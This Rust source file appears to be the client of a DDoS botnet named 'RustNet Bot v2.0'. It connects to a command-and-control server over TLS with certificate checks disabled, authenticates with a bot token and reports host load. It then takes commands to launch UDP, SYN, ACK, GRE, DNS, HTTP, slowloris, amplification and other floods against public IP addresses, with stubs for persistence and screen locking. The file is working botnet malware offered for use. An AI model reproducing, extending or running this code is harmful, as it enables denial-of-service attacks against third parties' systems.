mod attack_methods;

use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{sleep, Duration, timeout};
use tokio::sync::Semaphore;
use anyhow::Result;
use std::sync::Arc;
use std::time::Instant;
use std::collections::HashMap;
use tokio::sync::Mutex;
use tokio_rustls::rustls;
use tokio_rustls::TlsConnector;
use sysinfo::System;

const RECONNECT_DELAY: Duration = Duration::from_secs(5);
const READ_TIMEOUT: Duration = Duration::from_secs(60);
const MAX_CONCURRENT_ATTACKS: usize = 5;

#[derive(Debug)]
struct NoCertificateVerification;

impl rustls::client::danger::ServerCertVerifier for NoCertificateVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider().signature_verification_algorithms.supported_schemes()
    }
}

/// Load C2 server address from environment or use default
fn get_c2_address() -> String {
    // Try environment variable first
    if let Ok(addr) = std::env::var("C2_ADDRESS") {
        if !addr.is_empty() {
            return addr;
        }
    }
    
    // Try loading from file
    if let Ok(addr) = std::fs::read_to_string("c2_address.txt") {
        let addr = addr.trim();
        if !addr.is_empty() {
            return addr.to_string();
        }
    }
    
    // Default to localhost
    "127.0.0.1:7002".to_string()
}

/// Load bot auth token from environment or config file
fn get_bot_token() -> String {
    // Try environment variable first
    if let Ok(token) = std::env::var("BOT_AUTH_TOKEN") {
        if !token.is_empty() {
            return token;
        }
    }
    
    // Try loading from file
    if let Ok(token) = std::fs::read_to_string("bot_token.txt") {
        let token = token.trim();
        if !token.is_empty() {
            return token.to_string();
        }
    }
    
    eprintln!("ERROR: Bot authentication token not configured!");
    eprintln!("Please set BOT_AUTH_TOKEN environment variable or create bot_token.txt file.");
    eprintln!("Get your token by running '!regbot' command on the server.");
    std::process::exit(1);
}

/// Validate IP address to prevent attacks on private/internal networks
fn is_valid_target_ip(ip_str: &str) -> bool {
    use std::net::IpAddr;
    
    let ip: IpAddr = match ip_str.parse() {
        Ok(ip) => ip,
        Err(_) => return false,
    };
    
    match ip {
        IpAddr::V4(ipv4) => {
            // Block localhost, private, link-local, broadcast, documentation IPs
            if ipv4.is_loopback() || ipv4.is_private() || ipv4.is_link_local() 
                || ipv4.is_broadcast() || ipv4.is_documentation() {
                return false;
            }
        }
        IpAddr::V6(ipv6) => {
            if ipv6.is_loopback() || ipv6.is_unspecified() {
                return false;
            }
        }
    }
    
    true
}

struct BotState {
    attack_semaphore: Arc<Semaphore>,
    active_attacks: Arc<tokio::sync::Mutex<usize>>,
    #[allow(dead_code)]
    thread_limit: usize,
    attack_handles: Arc<Mutex<HashMap<usize, tokio::task::JoinHandle<()>>>>,  // Track running attacks
}

impl BotState {
    fn new() -> Self {
        let thread_limit = num_cpus::get() * 2; // 2 threads per CPU core
        
        Self {
            attack_semaphore: Arc::new(Semaphore::new(MAX_CONCURRENT_ATTACKS)),
            active_attacks: Arc::new(tokio::sync::Mutex::new(0)),
            thread_limit,
            attack_handles: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();
    
    tracing::info!("🤖 RustNet Bot v2.0 - Starting");
    tracing::info!("CPU cores: {}", num_cpus::get());
    
    let state = Arc::new(BotState::new());
    
    let mut reconnect_delay = RECONNECT_DELAY;
    let max_reconnect_delay = Duration::from_secs(300); // Max 5 minutes
    
    loop {
        match connect_and_run(state.clone()).await {
            Ok(_) => {
                tracing::info!("Connection closed gracefully. Reconnecting...");
                reconnect_delay = RECONNECT_DELAY; // Reset delay on graceful disconnect
            }
            Err(e) => {
                tracing::error!("Error: {}. Reconnecting in {:?}...", e, reconnect_delay);
                sleep(reconnect_delay).await;
                
                // Exponential backoff: double delay up to max
                reconnect_delay = std::cmp::min(reconnect_delay * 2, max_reconnect_delay);
                continue;
            }
        }
        sleep(RECONNECT_DELAY).await;
    }
}

async fn connect_and_run(state: Arc<BotState>) -> Result<()> {
    let c2_address = get_c2_address();
    let stream = TcpStream::connect(&c2_address).await?;
    stream.set_nodelay(true)?; // Disable Nagle's algorithm for lower latency
    
    tracing::info!("[OK] Connected to C2 server at {}", c2_address);
    
    // Setup TLS
    let config = rustls::ClientConfig::builder_with_provider(Arc::new(rustls::crypto::ring::default_provider()))
        .with_safe_default_protocol_versions()?
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoCertificateVerification))
        .with_no_client_auth();
        
    let connector = TlsConnector::from(Arc::new(config));
    let domain = rustls::pki_types::ServerName::try_from("localhost")
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid dns name"))?;
        
    let mut conn = connector.connect(domain, stream).await?;
    
    // Send authentication token
    let bot_token = get_bot_token();
    let version = "2.0";
    let auth_msg = format!("AUTH {} {}\n", bot_token, version);
    conn.write_all(auth_msg.as_bytes()).await?;
    
    // Wait for auth response
    let mut auth_response = vec![0u8; 64];
    let n = conn.read(&mut auth_response).await?;
    let response = String::from_utf8_lossy(&auth_response[..n]);
    
    if !response.contains("AUTH_OK") {
        tracing::error!("Authentication failed: {}", response);
        return Err(anyhow::anyhow!("Bot authentication failed"));
    }
    
    tracing::info!("[OK] Authenticated with C2 server");
    
    // Wrap connection in Arc<Mutex<>> for shared access
    // We need to split it because TlsStream doesn't support concurrent read/write easily with Arc<Mutex> if we want to read in loop and write heartbeat
    // But TlsStream implements AsyncRead+AsyncWrite, so we can use tokio::io::split
    
    let (reader, writer) = tokio::io::split(conn);
    let reader = Arc::new(tokio::sync::Mutex::new(reader));
    let writer = Arc::new(tokio::sync::Mutex::new(writer));
    
    // Spawn status reporting task
    let writer_status = writer.clone();
    let status_task = tokio::spawn(async move {
        let mut sys = System::new();
        let mut interval = tokio::time::interval(Duration::from_secs(10));
        loop {
            interval.tick().await;
            sys.refresh_cpu();
            sys.refresh_memory();
            let cpu = sys.global_cpu_info().cpu_usage();
            let mem = if sys.total_memory() > 0 {
                (sys.used_memory() as f32 / sys.total_memory() as f32) * 100.0
            } else {
                0.0
            };
            
            let status_msg = format!("STATUS {:.1} {:.1}\n", cpu, mem);
            let mut w = writer_status.lock().await;
            if w.write_all(status_msg.as_bytes()).await.is_err() {
                break;
            }
        }
    });
    
    // Main command loop
    loop {
        let mut line = String::new();
        let mut buf = [0u8; 1];
        
        // Read line with timeout
        let read_result = timeout(READ_TIMEOUT, async {
            let mut r = reader.lock().await;
            loop {
                match r.read(&mut buf).await {
                    Ok(0) => return Ok::<usize, std::io::Error>(0),
                    Ok(_) => {
                        let ch = buf[0] as char;
                        if ch == '\n' {
                            break;
                        }
                        if ch != '\r' {
                            line.push(ch);
                        }
                    }
                    Err(e) => return Err(e),
                }
            }
            Ok(line.len())
        }).await;
        
        match read_result {
            Ok(Ok(bytes_read)) => {
                if bytes_read == 0 {
                    tracing::info!("Connection closed by server");
                    break;
                }
                
                let command = line.trim();
                if !command.is_empty() {
                    if command == "PING" {
                        tracing::debug!("Received PING");
                        let mut w = writer.lock().await;
                        if let Err(e) = w.write_all(b"PONG\n").await {
                             tracing::error!("Failed to send PONG: {}", e);
                             break;
                        }
                    } else {
                        if let Err(e) = handle_command(command, state.clone()).await {
                            tracing::error!("Failed to handle command '{}': {}", command, e);
                        }
                    }
                }
            }
            Ok(Err(e)) => {
                tracing::error!("Read error: {}", e);
                break;
            }
            Err(_) => {
                tracing::warn!("Read timeout - connection may be dead");
                break;
            }
        }
    }
    
    status_task.abort();
    Ok(())
}

async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
    let fields: Vec<&str> = command.split_whitespace().collect();
    
    if fields.is_empty() {
        return Ok(());
    }
    
    let cmd = fields[0];
    
    // Attack commands
    match cmd {
        "!udpflood" | "!udpsmart" | "!tcpflood" | "!synflood" | 
        "!ackflood" | "!greflood" | "!dns" | "!http" => {
            handle_attack_command(cmd, &fields, state).await?;
        }
        
        "STOP" => {
            if fields.len() >= 2 {
                if let Ok(attack_id) = fields[1].parse::<usize>() {
                    tracing::info!("Received STOP command for attack {}", attack_id);
                    
                    // Cancel the attack task if it exists
                    let mut handles = state.attack_handles.lock().await;
                    if let Some(handle) = handles.remove(&attack_id) {
                        handle.abort();
                        tracing::info!("Attack {} task cancelled", attack_id);
                    } else {
                        tracing::warn!("Attack {} not found or already completed", attack_id);
                    }
                } else {
                    tracing::warn!("Invalid attack ID in STOP command: {}", fields[1]);
                }
            }
        }
        
        "!kill" => {
            tracing::warn!("Received kill command - shutting down");
            std::process::exit(0);
        }
        
        "!lock" => {
            tracing::info!("Lock command received");
            // Placeholder for screen lock functionality
        }
        
        "!persist" => {
            tracing::info!("Persist command received");
            // Placeholder for persistence functionality
        }
        
        _ => {
            tracing::warn!("Unknown command: {}", cmd);
        }
    }
    
    Ok(())
}

async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>) -> Result<()> {
    // Validate command format - REQUIRE attack_id
    let (target, port, duration, attack_id) = if cmd == "!greflood" {
        if fields.len() != 4 { // !greflood <ip> <duration> <attack_id>
            return Err(anyhow::anyhow!("Invalid command format for {} - expected: !greflood <ip> <duration> <attack_id>", cmd));
        }
        let target = fields[1].to_string();
        let duration = fields[2].parse::<u64>()?;
        let attack_id = fields[3].parse::<usize>()?;
        (target, 0u16, duration, attack_id)
    } else {
        if fields.len() != 5 {  // Command + IP + port + duration + attack_id
            return Err(anyhow::anyhow!("Invalid command format for {} - expected: {} <ip> <port> <duration> <attack_id>", cmd, cmd));
        }
        let target = fields[1].to_string();
        let port = fields[2].parse::<u16>()?;
        let duration = fields[3].parse::<u64>()?;
        let attack_id = fields[4].parse::<usize>()?;
        (target, port, duration, attack_id)
    };
    
    // Validate target IP (prevent attacks on private networks)
    if !is_valid_target_ip(&target) {
        tracing::warn!("Rejected attack on invalid/private IP: {}", target);
        return Err(anyhow::anyhow!("Target IP is invalid or in blocked range"));
    }
    
    // Validate duration (1-3600 seconds)
    if duration == 0 || duration > 3600 {
        tracing::warn!("Rejected attack with invalid duration: {}s", duration);
        return Err(anyhow::anyhow!("Invalid duration: must be 1-3600 seconds"));
    }
    
    // Check if we can start a new attack (semaphore-based rate limiting)
    let permit = state.attack_semaphore.clone().try_acquire_owned();
    if permit.is_err() {
        tracing::warn!("Attack limit reached - dropping attack command");
        return Ok(());
    }
    
    let permit = match permit {
        Ok(p) => p,
        Err(_) => {
            tracing::warn!("Failed to acquire attack permit");
            return Ok(());
        }
    };
    
    // Increment active attack counter
    {
        let mut active = state.active_attacks.lock().await;
        *active += 1;
        tracing::info!("Starting attack: {} {}:{} for {}s ({} active)", cmd, target, port, duration, *active);
    }
    
    // Spawn attack task
    let state_clone = state.clone();
    let cmd_owned = cmd.to_string(); // Convert to owned string
    let handle = tokio::spawn(async move {
        let start = Instant::now();
        let cmd = cmd_owned.as_str(); // Convert back to &str inside spawn
        
        let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match cmd {
            "!udpflood" => {
                attack_methods::udp_flood(&target, port, duration).await;
                Ok(())
            }
            "!udpsmart" => {
                attack_methods::udp_smart(&target, port, duration).await;
                Ok(())
            }
            "!tcpflood" => {
                attack_methods::tcp_flood(&target, port, duration).await;
                Ok(())
            }
            "!synflood" => {
                attack_methods::syn_flood(&target, port, duration).await;
                Ok(())
            }
            "!ackflood" => {
                attack_methods::ack_flood(&target, port, duration).await;
                Ok(())
            }
            "!greflood" => {
                attack_methods::gre_flood(&target, duration).await;
                Ok(())
            }
            "!dns" => {
                attack_methods::dns_flood(&target, port, duration).await;
                Ok(())
            }
            "!http" => {
                attack_methods::http_flood(&target, port, duration).await;
                Ok(())
            }
            "!slowloris" => {
                attack_methods::slowloris(&target, port, duration).await;
                Ok(())
            }
            "!sslflood" => {
                attack_methods::ssl_flood(&target, port, duration).await;
                Ok(())
            }
            "!websocket" => {
                attack_methods::websocket_flood(&target, port, duration).await;
                Ok(())
            }
            "!icmpflood" => {
                attack_methods::icmp_flood(&target, duration).await;
                Ok(())
            }
            "!amplification" => {
                attack_methods::amplification_attack(&target, port, duration).await;
                Ok(())
            }
            "!connection" => {
                attack_methods::connection_exhaustion(&target, port, duration).await;
                Ok(())
            }
            _ => {
                tracing::warn!("Unknown attack command: {}", cmd);
                Ok(())
            }
        };
        
        let elapsed = start.elapsed().as_secs();
        
        if let Err(e) = result {
            tracing::error!("Attack {} failed: {}", cmd, e);
        } else {
            tracing::info!("Attack {} completed after {}s", cmd, elapsed);
        }
        
        // Decrement active attack counter
        {
            let mut active = state_clone.active_attacks.lock().await;
            *active = active.saturating_sub(1);
        }
        
        // Remove from tracked handles
        state_clone.attack_handles.lock().await.remove(&attack_id);
        
        drop(permit); // Release semaphore permit
    });
    
    // Store handle with attack_id for STOP command tracking
    state.attack_handles.lock().await.insert(attack_id, handle);
    
    Ok(())
}
